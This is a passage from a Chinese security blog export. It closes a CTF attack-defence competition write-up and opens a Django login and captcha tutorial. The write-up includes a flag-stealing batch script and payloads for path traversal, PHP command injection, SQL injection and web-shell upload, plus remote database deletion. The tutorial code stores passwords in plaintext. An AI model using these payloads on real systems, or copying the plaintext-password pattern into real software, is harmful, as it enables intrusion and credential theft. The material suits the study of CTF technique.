权限）下 kill -9 -1   杀死所有子进程（杀死当前用户所有进程，有权限下慎用），也可以直接killall apache2。这种操作并不会kill掉apache主进程，因为内存马是Apache启动的一个子进程；<br>13、同12，要注意守护进程的文件，这个才是最恶心的；<br>线下赛最重要的是文件、流量的监控和自身修补的防御，一人兼职边防边打往往会失去好多分  </p>\n</blockquote>\n<ol start=\"4\">\n<li>这次题目的分析</li>\n</ol>\n<p><strong>这里多说一句，涉及的工具和资源文件，可以参考我博客(xjseck.com)上的文章 和github上的资源文件</strong></p>\n<p>一、 上来备份文件，Web版的ssh，所以这里我直接给我的web都植入了一个一句话后门，使用<br><code>#tar -cvf /tmp/web1.rar /var/www/html</code> ，然后使用菜刀进行下载就好了<br>二、 进行D盾或者我github上写好的scanshell.py 进行后门的扫描<br>web1的扫描结果<br><img src=\"web1.png\" alt=\"scanshell\"><br>web2的扫描结果<br><img src=\"web2.png\" alt=\"scanshell\"><br>到这里的时候，队友就可以补上了，我们就很快速的写好了一个简单的批量脚本了，首轮就开始了进行手动提交flag了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">flag = []</span><br><span class=\"line\">ip = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>]</span><br><span class=\"line\"><span class=\"comment\"># 105</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ip:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        url = <span class=\"string\">\"http://172.20.10\"</span> + str(i) + <span class=\"string\">\".101\"</span> + <span class=\"string\">\"/index.php\"</span></span><br><span class=\"line\">        <span class=\"keyword\">print</span> url</span><br><span class=\"line\">        post = &#123;<span class=\"string\">'aa'</span>: <span class=\"string\">'system(\\\"cat /flaginfo.txt\\\");'</span>&#125;</span><br><span class=\"line\">        a = requests.post(url, data=post, timeout=<span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> a.status_code == <span class=\"number\">200</span>:</span><br><span class=\"line\">            <span class=\"keyword\">print</span> a.text[:<span class=\"number\">32</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n<p>其他的shell类推一下，只要针对能取得所有的队伍flag就ok了，因为flag刷新也就那么几轮，所以也就没有写自动化提交flag的脚本了。大多数时间，是在看神仙们打架。</p>\n<p>三、 队友手动上的waf文件的时候少写了一个字母导致，丢失了20分，后面大家的访问日志就正常保存了。</p>\n<p>四、 <strong>题目漏洞汇总</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">工具扫描的shell是几个问题。</span><br><span class=\"line\">分析源代码的漏洞大致有一下几点，都是手动构造的漏洞。</span><br><span class=\"line\">1. web1/about.php?f=../../../../../../../../../../../flaginfo.txt</span><br><span class=\"line\">2. web1/reg.php?a=system(&apos;cat /flaginfo.txt&apos;);</span><br><span class=\"line\">3. web1/index.php?123=system(&apos;cat /flaginfo.txt&apos;);</span><br><span class=\"line\">4. web1/message.php?id=1 union select 1,2,group_concat(user_name),4 from users--+  注入后台用户名，mysql5.7  不能读文件好气。进入后台,user.php</span><br><span class=\"line\">&lt;?php system(&quot;cat /root/flag.txt&quot;);?&gt;</span><br><span class=\"line\">其实主办方的意思是，登录后台就能显示flag内容的，但是flag文件确实flaginfo.txt,就问你是蛇皮的吧。</span><br><span class=\"line\">5. 最后阶段的时候丢了40分，突然就明白过来，不仅限于web服务，后面发现vsftp服务，直接允许匿名用户登录，映射的目录是根目录，直接可以刷一波 ftp://172.20.108.101/flaginfo.txt</span><br><span class=\"line\">6. web1  mysql 可以进行远程登录 mysql -h -uroot -p123 进行任意队伍的web1数据库的ctf删除掉，迫使主办方进行重置，刷分。</span><br><span class=\"line\">7. web1 后台的任意文件上传 POST /user/upload.php </span><br><span class=\"line\">images/1528712524shell.php 访问web1/images/1528712524.php </span><br><span class=\"line\">8. web2/index.php?aa=system(&apos;cat /flaginfo.txt&apos;);</span><br><span class=\"line\">9. web2/footer.php   POST shell=cat /flaginfo.txt</span><br><span class=\"line\">10. web2/config.php?c=system(&apos;cat /flaginfo.txt&apos;);</span><br><span class=\"line\">11. web2/.a.php?c=system(&apos;cat /flaginfo.txt&apos;);</span><br><span class=\"line\">12. web2/a.php?c=system(&apos;cat /flaginfo.txt&apos;);</span><br><span class=\"line\">13. search.php?id=1  SQLMAP 跑后台密码，登录出flag 但是 又蛇皮</span><br><span class=\"line\">14. 登录后有任意文件上传 </span><br><span class=\"line\">web2 的详细wp可以参考主办方提供的wp，上传到了github上了。</span><br></pre></td></tr></table></figure>\n<h2 id=\"防护\"><a href=\"#防护\" class=\"headerlink\" title=\"防护\"></a>防护</h2><p>  从上面的思路就可以知道，只要你发现了问题，才能比较好的进行修补，这次的比赛，也就是没有check文件，进行后台动态监控，选手的操作，主办方都不知道，哈哈哈，很蛇皮的吧。要是正常一点的话，就是web服务器一旦文件丢失或者web服务器不能访问，都会被扣分。网站的文件不多，都是能一眼可以看出问题的，手工都可以删改的吧。可能有队伍发现了，我们队伍使用的waf，哈哈，贴几个waf 防护的图片。<br><img src=\"web11.png\" alt=\"waf\"><br><img src=\"web222.png\" alt=\"waf\"></p>\n<h2 id=\"花絮\"><a href=\"#花絮\" class=\"headerlink\" title=\"花絮\"></a>花絮</h2><p>  这次的比赛没有使用写好的专门的脚本，进行批量植入内存马，主要是给了root权限，和满地的shell，也就没有必要了。希望后面赛事的提高再使用吧。后面分析日志文件，发现有的队伍竟然使用web目录扫描工具，我就觉的很蛇皮，明明大家的都一样，为毛使用扫描工具呢，日志量还不是一般的大，发现是108,107,103的队伍进行扫描的，只能说大佬们的套路多:)师傅们不要打我！早知道写一个策略好了，哈哈。<br><strong>最后感谢大象安全公司，为我们此次的比赛保驾护航！</strong></p>\n<p>  <img src=\"web3.png\" alt=\"waf\"><br>  <img src=\"web4.png\" alt=\"waf\"></p>\n","categories":["CTF"],"tags":["CTF","攻防竞赛"]},{"title":"Django学习笔记(四)","url":"https://www.xjseck.com/2018/02/10/Django学习笔记-四/","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>上两篇我们学习了MVT和Models进行数据库的操作，这一篇我们还是以实例来讲解，主要学习使用Django 编写一个 注册、登录、验证码的例子。</p>\n<ul>\n<li>我们将学到如下知识：<ul>\n<li>Django forms表单样式排版</li>\n<li>验证码实现的机制 cookies session 设置</li>\n<li>Django request对象传值</li>\n<li>Django 自带的用户登录判断</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h3><p>快速上手还是多动手敲打键盘编写代码，多动手实现。直接上学例子学习，主要是先建立Django实现功能的思想，里面的细枝末节可以搜索一下相关的资料进行补充巩固学习。<br>这里介绍两种编写的方法，一种是自己设计用户登录注销管理cookies和session。另一种就是使用Django自带判断登录 注销等</p>\n<h4 id=\"例子四（1）\"><a href=\"#例子四（1）\" class=\"headerlink\" title=\"例子四（1）\"></a>例子四（1）</h4><p>验证码的部分参考<a href=\"https://strcpy.me/index.php/archives/176/\" target=\"_blank\" rel=\"noopener\">https://strcpy.me/index.php/archives/176/</a><br>每次获取的验证码都需要把上次生成的验证码消除。<br>准备工作<br>以后准备工作都是相同的，设置方面也是一直的。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$python-admin startproject project  <span class=\"comment\">#创建项目</span></span><br><span class=\"line\">$python manage.py startapp blog     <span class=\"comment\">#创建应用</span></span><br><span class=\"line\"><span class=\"comment\">#设置数据库、应用加载、模板文件路径</span></span><br><span class=\"line\">DATABASES = &#123;</span><br><span class=\"line\">    <span class=\"string\">'default'</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">'ENGINE'</span>: <span class=\"string\">'django.db.backends.mysql'</span>,</span><br><span class=\"line\">        <span class=\"string\">'NAME'</span>: <span class=\"string\">'django-test'</span>,</span><br><span class=\"line\">        <span class=\"string\">'USER'</span>: <span class=\"string\">'root'</span>,</span><br><span class=\"line\">        <span class=\"string\">'PASSWORD'</span>: <span class=\"string\">'seck@root...'</span>,</span><br><span class=\"line\">        <span class=\"string\">'HOST'</span>: <span class=\"string\">'127.0.0.1'</span>,</span><br><span class=\"line\">        <span class=\"string\">'PORT'</span>: <span class=\"string\">'3306'</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">INSTALLED_APPS = (</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.admin'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.auth'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.contenttypes'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.sessions'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.messages'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.staticfiles'</span>,</span><br><span class=\"line\">    <span class=\"string\">'blog'</span>,</span><br><span class=\"line\">)</span><br><span class=\"line\">TEMPLATES = [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"string\">'BACKEND'</span>: <span class=\"string\">'django.template.backends.django.DjangoTemplates'</span>,</span><br><span class=\"line\">        <span class=\"string\">'DIRS'</span>: [os.path.join(BASE_DIR, <span class=\"string\">'templates'</span>)],</span><br><span class=\"line\">        <span class=\"string\">'APP_DIRS'</span>: <span class=\"keyword\">True</span>,</span><br><span class=\"line\">        <span class=\"string\">'OPTIONS'</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">'context_processors'</span>: [</span><br><span class=\"line\">                <span class=\"string\">'django.template.context_processors.debug'</span>,</span><br><span class=\"line\">                <span class=\"string\">'django.template.context_processors.request'</span>,</span><br><span class=\"line\">                <span class=\"string\">'django.contrib.auth.context_processors.auth'</span>,</span><br><span class=\"line\">                <span class=\"string\">'django.contrib.messages.context_processors.messages'</span>,</span><br><span class=\"line\">            ],</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure></p>\n<p><strong>项目的文件结构如图</strong><br><img src=\"1.jpg\" alt=\"\"><br><strong>首先编写models.py 创建数据库表结构</strong><br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#-*- coding:utf-8 _*-</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">author:seck</span></span><br><span class=\"line\"><span class=\"string\">time: 2018/01/28</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> django <span class=\"keyword\">import</span> forms</span><br><span class=\"line\"><span class=\"keyword\">from</span> .views <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserRegisterForm</span><span class=\"params\">(forms.Form)</span>:</span></span><br><span class=\"line\">    username = forms.CharField(label=<span class=\"string\">'用户名'</span>,max_length=<span class=\"number\">50</span>)</span><br><span class=\"line\">    password = forms.CharField(label=<span class=\"string\">'密码'</span>,widget=forms.PasswordInput())</span><br><span class=\"line\">    email = forms.EmailField(label=<span class=\"string\">'邮箱'</span>)</span><br><span class=\"line\">    <span class=\"comment\"># captcha1=captcha()</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserLoginForm</span><span class=\"params\">(forms.Form)</span>:</span></span><br><span class=\"line\">    username = forms.CharField(label=<span class=\"string\">'用户名'</span>, max_length=<span class=\"number\">50</span>)</span><br><span class=\"line\">    password = forms.CharField(label=<span class=\"string\">'密码'</span>, widget=forms.PasswordInput())</span><br></pre></td></tr></table></figure></p>\n<p><strong>编写forms.py</strong></p>\n<ul>\n<li>创建类，继承form.Form</li>\n<li>页面根据类的对象自动创建html标签</li>\n<li>提交，request.POST</li>\n<li>封装到类的对象里，obj=UserInfo(request.POST)</li>\n<li>用户输入是否合法</li>\n<li>obj.is_valid()</li>\n<li>全部合法，获取全部内容</li>\n<li>obj.clean()</li>\n<li>只有有不合法</li>\n<li>obj.errors<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#-*- coding:utf-8 _*-</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">author:seck</span></span><br><span class=\"line\"><span class=\"string\">time: 2018/01/28</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> django <span class=\"keyword\">import</span> forms</span><br><span class=\"line\"><span class=\"keyword\">from</span> .views <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserRegisterForm</span><span class=\"params\">(forms.Form)</span>:</span></span><br><span class=\"line\">    username = forms.CharField(</span><br><span class=\"line\">        required=<span class=\"keyword\">True</span>,</span><br><span class=\"line\">        error_messages=&#123;<span class=\"string\">'required'</span>:<span class=\"string\">'用户名不能为空'</span>&#125;,</span><br><span class=\"line\">        label=<span class=\"string\">'用户名'</span>,max_length=<span class=\"number\">50</span>,widget=forms.TextInput(attrs=&#123;<span class=\"string\">'placeholder'</span>: <span class=\"string\">'Username'</span>,<span class=\"string\">'class'</span>:<span class=\"string\">'username11'</span>&#125;))</span><br><span class=\"line\">    password = forms.CharField(label=<span class=\"string\">'密码'</span>,widget=forms.PasswordInput())</span><br><span class=\"line\">    email = forms.EmailField(label=<span class=\"string\">'邮箱'</span>)</span><br><span class=\"line\">    <span class=\"comment\"># captcha1=captcha()</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserLoginForm</span><span class=\"params\">(forms.Form)</span>:</span></span><br><span class=\"line\">    username = forms.CharField(required=<span class=\"keyword\">True</span>,</span><br><span class=\"line\">        error_messages=&#123;<span class=\"string\">'required'</span>:<span class=\"string\">'用户名不能为空'</span>&#125;,label=<span class=\"string\">'用户名'</span>, max_length=<span class=\"number\">50</span>)</span><br><span class=\"line\">    password = forms.CharField(label=<span class=\"string\">'密码'</span>, widget=forms.PasswordInput())</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>attrs属性是定义在html中用户登录框的css属性名称，error_messages 确认输入的是否规范返回错误的信息比如required=True 如果没有填入用户名，就会显示“用户名不能为空”<br>细节参考<a href=\"http://www.cnblogs.com/zhaijunming5/category/892772.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/zhaijunming5/category/892772.html</a><br><a href=\"http://www.cnblogs.com/yangmv/p/5327477.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/yangmv/p/5327477.html</a></p>\n<p><strong>编写views.py进行控制数据传送</strong><br>关键点的信息就是使用session控制验证码的验证。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> django.shortcuts <span class=\"keyword\">import</span> render</span><br><span class=\"line\"><span class=\"keyword\">from</span> django.http <span class=\"keyword\">import</span> HttpResponse,HttpResponseRedirect ,request</span><br><span class=\"line\"><span class=\"keyword\">from</span> captcha <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> .forms <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> .models <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># Create your views here.</span></span><br><span class=\"line\"><span class=\"comment\">#首先显示</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">(request)</span>:</span></span><br><span class=\"line\">    data=[]</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> request.session[<span class=\"string\">'username'</span>]:</span><br><span class=\"line\">            seesion=request.session[<span class=\"string\">'username'</span>]</span><br><span class=\"line\">            <span class=\"keyword\">print</span> seesion</span><br><span class=\"line\">            <span class=\"keyword\">if</span> seesion:</span><br><span class=\"line\">                data.append(seesion)</span><br><span class=\"line\">                <span class=\"keyword\">print</span> <span class=\"string\">\"login success!\"</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception , e:</span><br><span class=\"line\">        <span class=\"keyword\">print</span> (e)</span><br><span class=\"line\">        data.append(<span class=\"string\">'no login'</span>)</span><br><span class=\"line\">    title=<span class=\"string\">\"seck\"</span></span><br><span class=\"line\">    <span class=\"keyword\">print</span> request.COOKIES</span><br><span class=\"line\">    <span class=\"comment\"># return HttpResponse(\"&lt;img id='verifycode' src='/captcha/' alt='CheckCode'/&gt;\")</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render(request,<span class=\"string\">'blog/index.html'</span>,&#123;<span class=\"string\">'title'</span>:title,<span class=\"string\">'data'</span>:data&#125;,)</span><br><span class=\"line\"><span class=\"comment\">#验证码调用</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">captcha</span><span class=\"params\">(request)</span>:</span></span><br><span class=\"line\">    Cap = Captcha(request)</span><br><span class=\"line\">    Code =Cap.display()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Code</span><br><span class=\"line\"><span class=\"comment\">#注册</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">register</span><span class=\"params\">(request)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">'POST'</span>:</span><br><span class=\"line\">        userform =UserRegisterForm(request.POST)</span><br><span class=\"line\">        cap = request.POST.get(<span class=\"string\">'cap'</span>)</span><br><span class=\"line\">        ca = Captcha(request)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> userform.is_valid():</span><br><span class=\"line\">            username = userform.cleaned_data[<span class=\"string\">'username'</span>]</span><br><span class=\"line\">            password = userform.cleaned_data[<span class=\"string\">'password'</span>]</span><br><span class=\"line\">            email = userform.cleaned_data[<span class=\"string\">'email'</span>]</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ca.check(cap):</span><br><span class=\"line\">                <span class=\"keyword\">print</span> <span class=\"string\">\"The code true\"</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">print</span> <span class=\"string\">\"The code error!\"</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> HttpResponse(<span class=\"string\">\"验证码不正确,请刷新后重新输入！\"</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> User.objects.filter(username=username):</span><br><span class=\"line\">                <span class=\"keyword\">print</span> <span class=\"string\">\"The user exits\"</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> HttpResponse(<span class=\"string\">\"用户名重复！\"</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                User.objects.create(username=username, password=password, email=email).save()</span><br><span class=\"line\">                <span class=\"keyword\">return</span> HttpResponse(<span class=\"string\">'register success!'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        userform = UserRegisterForm()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render(request,<span class=\"string\">'blog/register.html'</span>,&#123;<span class=\"string\">'userform'</span>:userform,&#125;)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">login</span><span class=\"params\">(request)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">\"POST\"</span>:</span><br><span class=\"line\">        userform = UserLoginForm(request.POST)</span><br><span class=\"line\">        <span class=\"keyword\">print</span> userform.errors.get(<span class=\"string\">'username'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> userform.is_valid():</span><br><span class=\"line\">            username = userform.cleaned_data[<span class=\"string\">'username'</span>]</span><br><span class=\"line\">            password = userform.cleaned_data[<span class=\"string\">'password'</span>]</span><br><span class=\"line\">            user= User.objects.filter(username__exact=username,password__exact=password)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> user:</span><br><span class=\"line\">                <span class=\"comment\">#Step1:生成随机字符串(seesionID)</span></span><br><span class=\"line\">                <span class=\"comment\">#Step2：通过cookie发送给客户端</span></span><br><span class=\"line\">                <span class=\"comment\">#Step3：服务端保存 session</span></span><br><span class=\"line\">                <span class=\"keyword\">print</span> <span class=\"string\">\"seck\"</span></span><br><span class=\"line\">                <span class=\"comment\"># print user.values()[0][username]</span></span><br><span class=\"line\">                request.session[<span class=\"string\">'username'</span>]=username</span><br><span class=\"line\">                <span class=\"keyword\">print</span> request.session</span><br><span class=\"line\">                <span class=\"comment\"># return render(request,'blog/index.html',&#123;'userform':userform&#125;)</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> HttpResponseRedirect(<span class=\"string\">'/'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> HttpResponse(<span class=\"string\">'用户名或者密码错误！'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">\"stsrat\"</span></span><br><span class=\"line\">        userform=UserLoginForm()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render(request,<span class=\"string\">'blog/login.html'</span>,&#123;<span class=\"string\">'userform'</span>:userform&#125;)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">sign_out</span><span class=\"params\">(request)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">del</span> request.session[<span class=\"string\">'username'</span>]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> HttpResponseRedirect(<span class=\"string\">'/'</span>)</span><br></pre></td></tr></table></figure>\n<p><strong>urls.py 的设置</strong><br>blog/urls.py<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#-*- coding:utf-8 _*-</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">author:seck</span></span><br><span class=\"line\"><span class=\"string\">time: 2018/01/28</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> django.conf.urls <span class=\"keyword\">import</span> include, url</span><br><span class=\"line\"><span class=\"keyword\">from</span> views <span class=\"keyword\">import</span> *</span><br><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">    <span class=\"comment\"># Examples:</span></span><br><span class=\"line\">    <span class=\"comment\"># url(r'^$', 'blog_week_6.views.home', name='home'),</span></span><br><span class=\"line\">    url(<span class=\"string\">r'^captcha/$'</span>,captcha),</span><br><span class=\"line\">    url(<span class=\"string\">r'^login/$'</span>,login),</span><br><span class=\"line\">    url(<span class=\"string\">r'^register/$'</span>,register),</span><br><span class=\"line\">    url(<span class=\"string\">r'^sign_out/$'</span>,sign_out),</span><br><span class=\"line\">    url(<span class=\"string\">r''</span>, index,name=<span 